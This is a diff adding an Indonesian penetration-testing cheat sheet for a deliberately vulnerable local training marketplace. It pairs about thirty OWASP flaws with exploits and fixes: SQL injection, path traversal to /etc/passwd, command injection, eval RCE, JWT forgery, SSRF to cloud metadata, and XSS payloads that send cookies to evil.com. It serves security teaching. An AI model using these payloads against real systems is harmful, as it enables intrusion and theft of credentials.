@@ -1,0 +1,326 @@
+╔══════════════════════════════════════════════════════════════╗
+║     IVM - ID-NETWORKERS VULNERABLE MARKETPLACE               ║
+║     Penetration Testing Cheat Sheet                          ║
+║     Focus: Understand the vulnerability, not just exploit    ║
+╚══════════════════════════════════════════════════════════════╝
+
+TOOLS YANG DIREKOMENDASIKAN:
+  - Burp Suite (intercept & modify requests)
+  - curl / httpie (manual HTTP requests)
+  - sqlmap (automated SQL injection)
+  - Browser DevTools (inspect cookies, localStorage, network)
+  - jwt.io (decode/forge JWT tokens)
+  - hashcat / john (password cracking)
+
+════════════════════════════════════════════════════════════════
+  A01 — BROKEN ACCESS CONTROL
+════════════════════════════════════════════════════════════════
+
+[1] IDOR — Akses Data User Lain
+    apa yang salah: Tidak ada pengecekan kepemilikan data
+    endpoint:       GET /api/user/:id
+    exploit:        curl http://localhost:3001/api/user/1
+                    curl http://localhost:3001/api/user/2
+                    curl http://localhost:3001/api/user/3
+    dampak:         Bisa melihat email, alamat, telepon, bio semua user
+    mitigasi:       Verifikasi req.user.id === req.params.id
+
+[2] IDOR — Wallet User Lain
+    apa yang salah: Endpoint wallet tanpa auth check
+    endpoint:       GET /api/wallet/:userId
+    exploit:        curl http://localhost:3001/api/wallet/1
+    dampak:         Melihat saldo wallet semua user
+    mitigasi:       Cek kepemilikan wallet sebelum return data
+
+[3] User Data Export — No Authentication
+    apa yang salah: Endpoint dump data tanpa authentication
+    endpoint:       GET /api/users/export
+    exploit:        curl http://localhost:3001/api/users/export
+    dampak:         Semua data user termasuk password hash terekspos
+    mitigasi:       Require admin auth, jangan expose password hashes
+
+[4] Database Backup — No Auth + SQLi
+    apa yang salah: Backup endpoint tanpa auth, table name dari user input
+    endpoint:       GET /api/backup/:table
+    exploit:        curl http://localhost:3001/api/backup/users
+                    curl "http://localhost:3001/api/backup/users%20UNION%20SELECT%20*%20FROM%20wallets"
+    dampak:         Dump seluruh database tanpa authentication
+    mitigasi:       Whitelist tabel, require admin auth, parameterized queries
+
+[5] Path Traversal / LFI
+    apa yang salah: Tidak ada sanitasi path pada fs.readFileSync()
+    endpoint:       GET /api/admin/logs?f=<path>
+    exploit:        curl "http://localhost:3001/api/admin/logs?f=../../../../etc/passwd"
+                    curl "http://localhost:3001/api/admin/logs?f=/app/.env"
+    dampak:         Baca file apapun di server (credentials, config, source)
+    mitigasi:       path.resolve() + path validation, whitelist files
+
+════════════════════════════════════════════════════════════════
+  A02 — CRYPTOGRAPHIC FAILURES
+════════════════════════════════════════════════════════════════
+
+[6] MD5 Password Hashing
+    apa yang salah: MD5 tanpa salt — mudah di-crack via rainbow table
+    lokasi:         Database, POST /api/login, POST /api/register
+    contoh hash:    0192023a7bbd73250516f069df18b500 = admin123
+    exploit:        Gunakan hashcat: hashcat -a 0 -m 0 hash.txt rockyou.txt
+    mitigasi:       Gunakan bcrypt atau argon2 dengan salt
+
+[7] Weak JWT Secret
+    apa yang salah: JWT secret = "secret123" — bisa di-bruteforce
+    lokasi:         server.js jwt.sign() / jwt.verify()
+    exploit:        hashcat -a 0 -m 16500 jwt.txt rockyou.txt
+                    Setelah dapat secret, forge token dengan role admin
+    mitigasi:       Gunakan 256-bit random secret, rotate secara berkala
+
+[8] JWT Algorithm "none"
+    apa yang salah: Server menerima alg:"none" — signature bisa di-bypass
+    lokasi:         jwt.verify(token, secret, { algorithms: ['HS256', 'none'] })
+    exploit:        1. Decode JWT
+                    2. Ubah header: {"alg":"none","typ":"JWT"}
+                    3. Ubah payload: {"id":1,"role":"admin"}
+                    4. Token = base64(header).base64(payload).
+    mitigasi:       Whitelist algorithms: ['HS256'] saja
+
+[9] Base64 Cookie Forgery
+    apa yang salah: Cookie remember_me hanya Base64 encode tanpa signing
+    lokasi:         POST /api/login (Set-Cookie: remember_me=...)
+    exploit:        echo '{"id":1,"username":"admin","role":"admin"}' | base64
+                    Set cookie remember_me=<result>
+    mitigasi:       Gunakan signed cookies, atau JWT untuk remember-me
+
+════════════════════════════════════════════════════════════════
+  A03 — INJECTION
+════════════════════════════════════════════════════════════════
+
+[10] SQL Injection — Login Bypass
+     apa yang salah: String concatenation di SQL query
+     endpoint:       POST /api/login
+     exploit:        {"username":"' OR '1'='1' -- -","password":"anything"}
+                     {"username":"admin'-- -","password":"anything"}
+     dampak:         Bypass authentication, login sebagai user manapun
+     mitigasi:       Prepared statements: db.query('SELECT * FROM users WHERE username=?', [username])
+
+[11] SQL Injection — Union Based (Search)
+     apa yang salah: LIKE clause tanpa parameterized query
+     endpoint:       GET /api/search?q=
+     exploit:        ?q=' UNION SELECT 1,2,username,password,5,6,7,8 FROM users-- -
+     dampak:         Exfiltrate semua data dari database
+     mitigasi:       Gunakan parameterized LIKE: WHERE name LIKE CONCAT('%', ?, '%')
+
+[12] SQL Injection — Password Reset
+     apa yang salah: Username field langsung di-concat ke query
+     endpoint:       POST /api/password-reset
+     exploit:        {"username":"admin","new_password":"hacked123"}
+                     Atau SQLi: {"username":"' OR '1'='1","new_password":"pwned"}
+     dampak:         Reset password user manapun
+     mitigasi:       Prepared statements + email verification (OTP)
+
+[13] Reflected XSS
+     apa yang salah: Input user di-echo tanpa sanitasi, render dengan dangerouslySetInnerHTML
+     endpoint:       GET /api/search?q=<payload>
+     exploit:        ?q=<img src=x onerror=alert(document.cookie)>
+                     ?q=<script>fetch('https://evil.com/?c='+document.cookie)</script>
+     dampak:         Steal cookies, session hijacking
+     mitigasi:       Escape HTML entities, jangan gunakan dangerouslySetInnerHTML
+
+[14] Stored XSS
+     apa yang salah: Review comment disimpan dan dirender sebagai raw HTML
+     endpoint:       POST /api/reviews (write), GET /api/reviews/:id (read)
+     exploit:        {"comment":"<img src=x onerror=\"fetch('https://evil.com/?c='+document.cookie)\">","rating":5}
+     dampak:         Persistent XSS — semua user yang melihat review terpengaruh
+     mitigasi:       Sanitize dengan DOMPurify, escape HTML, set HttpOnly cookies
+
+[15] OS Command Injection
+     apa yang salah: Input langsung ke child_process.exec()
+     endpoint:       POST /api/admin/ping
+     exploit:        {"host":"127.0.0.1; cat /etc/passwd"}
+                     {"host":"127.0.0.1 && whoami"}
+                     {"host":"127.0.0.1 | ls -la /app/"}
+     dampak:         Full RCE di server
+     mitigasi:       Gunakan execFile() dengan array args, validasi input
+
+[16] RCE via eval()
+     apa yang salah: Input user langsung ke eval()
+     endpoint:       POST /api/debug
+     exploit:        {"code":"require('child_process').execSync('id').toString()"}
+                     {"code":"require('fs').readFileSync('/etc/passwd','utf8')"}
+                     {"code":"process.env"}
+     dampak:         Full RCE — eksekusi code JavaScript arbitrary
+     mitigasi:       Hapus eval(), hapus debug endpoint di production
+
+[17] Server-Side Template Injection (SSTI)
+     apa yang salah: Template literal di-eval() dari user input
+     endpoint:       POST /api/feedback
+     exploit:        {"name":"${require('child_process').execSync('whoami')}","message":"test"}
+                     {"name":"${7*7}","message":"test"}
+     dampak:         RCE melalui template expression
+     mitigasi:       Gunakan template engine dengan auto-escaping (Handlebars, EJS)
+
+════════════════════════════════════════════════════════════════
+  A04 — INSECURE DESIGN
+════════════════════════════════════════════════════════════════
+
+[18] Mass Assignment / Privilege Escalation
+     apa yang salah: Semua field dari req.body diterima termasuk "role"
+     endpoint:       PUT /api/user/update
+     exploit:        curl -X PUT http://localhost:3001/api/user/update \
+                       -H "Authorization: Bearer <token>" \
+                       -H "Content-Type: application/json" \
+                       -d '{"role":"admin"}'
+     dampak:         User biasa bisa menjadi admin
+     mitigasi:       Whitelist allowed fields, gunakan DTO/schema validation
+
+[19] Price Tampering
+     apa yang salah: Server menerima harga dari client tanpa recalculation
+     endpoint:       POST /api/order
+     exploit:        Intercept request, ubah total_price ke 0.01
+     dampak:         Beli barang gratis
+     mitigasi:       Hitung harga di server dari database, jangan percaya client
+
+[20] Race Condition (Infinite Money)
+     apa yang salah: Balance check dan update tanpa transaction lock
+     endpoint:       POST /api/wallet/withdraw
+     exploit:        # Kirim 20+ request parallel:
+                     for i in $(seq 1 20); do
+                       curl -X POST http://localhost:3001/api/wallet/withdraw \
+                         -H "Authorization: Bearer <token>" \
+                         -H "Content-Type: application/json" \
+                         -d '{"amount":100}' &
+                     done
+     dampak:         Withdraw lebih dari saldo (saldo jadi negatif)
+     mitigasi:       SELECT ... FOR UPDATE, atau atomic UPDATE
+
+[21] Unrestricted File Upload
+     apa yang salah: Tidak ada validasi file extension/MIME type
+     endpoint:       POST /api/upload
+     exploit:        curl -F "file=@shell.html" http://localhost:3001/api/upload
+                     Akses: http://localhost:3001/uploads/shell.html
+     dampak:         Upload HTML/JS/shell yang bisa dieksekusi
+     mitigasi:       Whitelist extensions, cek MIME type, rename file
+
+[22] Insecure Password Reset
+     apa yang salah: Reset password tanpa email verification
+     endpoint:       POST /api/password-reset
+     exploit:        {"username":"admin","new_password":"hacked"}
+     dampak:         Takeover akun siapapun yang diketahui usernamenya
+     mitigasi:       Kirim OTP ke email, gunakan temporary token
+
+════════════════════════════════════════════════════════════════
+  A05 — SECURITY MISCONFIGURATION
+════════════════════════════════════════════════════════════════
+
+[23] Exposed Configuration
+     apa yang salah: Endpoint config menampilkan semua secrets
+     endpoint:       GET /api/config
+     exploit:        curl http://localhost:3001/api/config
+     dampak:         JWT secret, DB password, semua environment variables terekspos
+     mitigasi:       Hapus endpoint, atau require strong admin auth
+
+[24] Verbose Error Messages
+     apa yang salah: SQL errors dan stack traces dikirim ke client
+     lokasi:         Semua endpoint
+     dampak:         Attacker mendapat informasi internal (query, table names)
+     mitigasi:       Generic error messages, log details hanya di server
+
+[25] robots.txt Exposing Hidden Endpoints
+     apa yang salah: robots.txt meng-list semua hidden endpoint
+     endpoint:       GET /api/robots.txt
+     exploit:        curl http://localhost:3001/api/robots.txt
+     dampak:         Attacker mengetahui semua endpoint sensitif
+     mitigasi:       Jangan list endpoint sensitif, gunakan proper auth
+
+[26] CORS Wildcard
+     apa yang salah: CORS allow origin: true (semua origin diizinkan)
+     lokasi:         server.js cors() middleware
+     dampak:         Any website bisa make request ke API dengan credentials
+     mitigasi:       Whitelist domain spesifik
+
+[27] Redis tanpa Password
+     apa yang salah: Redis exposed tanpa authentication
+     lokasi:         docker-compose.yml port 6379
+     exploit:        redis-cli -h localhost -p 6379 KEYS *
+     dampak:         Akses semua session data
+     mitigasi:       Set password, jangan expose port ke luar
+
+════════════════════════════════════════════════════════════════
+  A07 — IDENTIFICATION & AUTHENTICATION FAILURES
+════════════════════════════════════════════════════════════════
+
+[28] No Rate Limiting
+     apa yang salah: Tidak ada brute-force protection
+     endpoint:       POST /api/login
+     exploit:        Brute force password dengan wordlist
+     mitigasi:       Implement rate limiting, account lockout
+
+[29] Client-Side Admin Check
+     apa yang salah: Admin panel di-hide hanya di React (client-side)
+     lokasi:         AdminDashboard.jsx — conditional rendering
+     exploit:        Langsung call /api/admin/* endpoints dengan user token
+     dampak:         User biasa bisa akses semua fungsi admin
+     mitigasi:       Backend middleware untuk cek role
+
+════════════════════════════════════════════════════════════════
+  A10 — SERVER-SIDE REQUEST FORGERY (SSRF)
+════════════════════════════════════════════════════════════════
+
+[30] SSRF via Export PDF
+     apa yang salah: Server fetch URL dari user tanpa validasi
+     endpoint:       POST /api/export-pdf
+     exploit:        # Akses internal service:
+                     {"url":"http://backend:3001/api/config"}
+                     {"url":"http://backend:3001/api/users/export"}
+                     {"url":"http://backend:3001/api/internal/metadata"}
+                     # Akses cloud metadata:
+                     {"url":"http://169.254.169.254/latest/meta-data/"}
+     dampak:         Akses service internal, leak secrets
+     mitigasi:       Whitelist domains, block private IPs
+
+════════════════════════════════════════════════════════════════
+  RECONNAISSANCE — Langkah Awal
+════════════════════════════════════════════════════════════════
+
+  1. Cek robots.txt:
+     curl http://localhost:3001/api/robots.txt
+
+  2. Cek health/config endpoint:
+     curl http://localhost:3001/api/health
+     curl http://localhost:3001/api/config
+
+  3. Enumerate users:
+     for i in $(seq 1 10); do
+       curl -s http://localhost:3001/api/user/$i | jq .
+     done
+
+  4. Cek export endpoint:
+     curl http://localhost:3001/api/users/export
+
+  5. Cek Redis:
+     redis-cli -h localhost -p 6379 KEYS *
+
+════════════════════════════════════════════════════════════════
+  TIPS UNTUK PESERTA
+════════════════════════════════════════════════════════════════
+
+  ★ Jangan hanya fokus pada "berhasil exploit"
+    → Pahami MENGAPA vulnerability itu ada
+    → Pikirkan APA dampak di dunia nyata
+    → Ketahui BAGAIMANA cara memperbaikinya
+
+  ★ Gunakan Burp Suite untuk intercept dan modify request
+  ★ Perhatikan response headers dan error messages
+  ★ Cek source code frontend di browser DevTools
+  ★ Baca dokumentasi OWASP Top 10 untuk pemahaman mendalam
+  ★ Catat setiap temuan dalam format laporan pentest
+
+  Format Laporan:
+  ┌──────────────────────────────────────────┐
+  │ Vulnerability: [Nama]                    │
+  │ OWASP Category: [A01-A10]                │
+  │ Endpoint: [URL]                          │
+  │ Severity: [Critical/High/Medium/Low]     │
+  │ Deskripsi: [Apa yang salah]              │
+  │ Steps to Reproduce: [Langkah exploit]    │
+  │ Impact: [Dampak jika dieksploitasi]      │
+  │ Recommendation: [Cara mitigasi]          │
+  └──────────────────────────────────────────┘
